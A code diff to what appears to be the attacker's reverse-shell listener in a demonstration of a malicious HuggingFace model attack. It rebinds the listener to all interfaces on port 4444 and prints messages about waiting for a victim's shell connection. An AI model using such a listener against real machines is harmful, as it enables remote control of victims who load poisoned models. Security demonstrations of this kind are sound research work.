@@ -26,7 +26,9 @@ load_dotenv(Path(__file__).parent / ".env")
 
 console = Console()
 
-HOST = os.getenv("ATTACKER_HOST", "127.0.0.1")
+# Listener binds to 0.0.0.0 (all interfaces) to accept connections from any IP
+LISTEN_HOST = "0.0.0.0"
+DISPLAY_HOST = os.getenv("ATTACKER_HOST", "127.0.0.1")
 PORT = int(os.getenv("ATTACKER_PORT", "4444"))
 
 def main():
@@ -35,7 +37,7 @@ def main():
 
 Waiting for a victim to load the malicious HuggingFace model...
 
-[bold]Listening on:[/bold] {HOST}:{PORT}
+[bold]Listening on:[/bold] 0.0.0.0:{PORT} (Victim connects to {DISPLAY_HOST}:{PORT})
 
 [yellow]Demo Setup:[/yellow]
   
@@ -56,9 +58,9 @@ Commands like 'pwd', 'history', 'whoami' all work.
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
     try:
-        server.bind((HOST, PORT))
+        server.bind((LISTEN_HOST, PORT))
         server.listen(1)
-        console.print(f"[dim]Listening on {HOST}:{PORT}...[/dim]\n")
+        console.print(f"[dim]Listening on {LISTEN_HOST}:{PORT} (Victim connects to {DISPLAY_HOST}:{PORT})...[/dim]\n")
         
         # Wait for connection
         conn, addr = server.accept()
